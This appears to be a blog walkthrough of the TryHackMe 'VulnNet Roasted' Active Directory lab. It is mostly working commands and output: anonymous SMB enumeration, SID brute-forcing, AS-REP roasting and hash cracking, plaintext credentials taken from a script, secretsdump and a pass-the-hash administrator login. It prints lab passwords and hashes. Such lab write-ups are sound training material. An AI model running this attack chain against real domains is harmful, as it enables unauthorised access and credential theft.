---
title: Walkthrough - VulnNet Roasted
published: true
---

Windows Server, Active Directory, Enumeration, Kerberos, Roasting, SMB, evil-winrm. VulnNet Entertainment quickly deployed another management instance on their very broad network...

[https://tryhackme.com/room/vulnnetroasted](https://tryhackme.com/room/vulnnetroasted)

* * *

## Notes

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-14 20:07:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

- `smbclient -L 10.10.65.165` we are allowed to see shars anonymously.

```
Password for [WORKGROUP\0xskar]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.65.165 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Lets check out what is in the Anonymous shares, and download them.

- `smbclient \\\\10.10.65.165\\VulnNet-Business-Anonymous\\ -N -c 'prompt OFF; recurse ON;mget *'`
- `smbclient \\\\10.10.65.165\\VulnNet-Enterprise-Anonymous\\ -N -c 'prompt OFF; recurse ON;mget *'`

Lots of names in these files, lets try making a list and gathering credentials.

```
alexa
whitehat
jack
goldenhand
tony 
skid
johnny 
leet
```

- check which shares are readable or writable `smbmap -u anonymous -H 10.10.181.27`
- since we have access to `IPC$` anonymously, we can use impacket lookupsid to list domain users `python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.181.27 | tee users.txt` and save them to another file so we can extract the users

```
[*] Brute forcing SIDs at 10.10.181.27
[*] StringBinding ncacn_np:10.10.181.27[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

- extract the users so we can use the userfile with GetNPUsers.py to find users without Kerberos pre-authentication.
- `grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users-cut.txt` 

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/VulnNet-Roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \                                     
> -dc-ip 10.10.220.192 \
> -usersfile users-cut.txt \
> -no-pass \
> vulnnet-rst.local/
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:bd77ca3bbc7b36c490b15c39c24b304b$30c3c9569c4c75a02e00092806aaf8dd28075a64be0d5fe1cd91729db5ccaf7c53b2a6d27666f3a182b1cb143515d79eb2623d3de05306300efaabaed91cde2cca74ac40ddf335994becac4b915538a2f49cff101261958141f7c2f0dd24828413183d44d8d25b1d3ec77c417ef1e4f577b31a2e0d751def5db906885e16291c49f076660a666b0a8e1a3152dbf50cb58141b7b3f9244fe34bf1d16115555edca83894e65c1bd55ea250f5eb2685c72e1152b5a2390379f56fa78596315328cf64931caba3e73e91703684063987f6574e2f80b7711fc36271dd4805ef9d3b6e37e1ab80140b87ef647d8977adf1accac2859b9989e6
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- crack users hash `john t-skid_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- `tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)`
- `t-skid:tj072889*`

Using these credentials we are not able to access the NETLOGON share on Samba

Within the VBS script file on the share we fine more credientials we can use to access the system

```
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

- `evil-winrm -i 10.10.220.192 -u a-whitehat -p "bNdKVkjv3RR9ht"`

* * * 

## What is the content of user.txt?

```
Directory: C:\users\enterprise-core-vn\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt
```

* * * 

## What is the content of root.txt?

We can use impackets secretsdump.py to dump hashes

- `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.220.192`

With the administrator's hash we can connect and get the system flag.

- `evil-winrm -i 10.10.220.192 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"`

![0xskar](/assets/vulnnet-roasted01.png)

* * * 

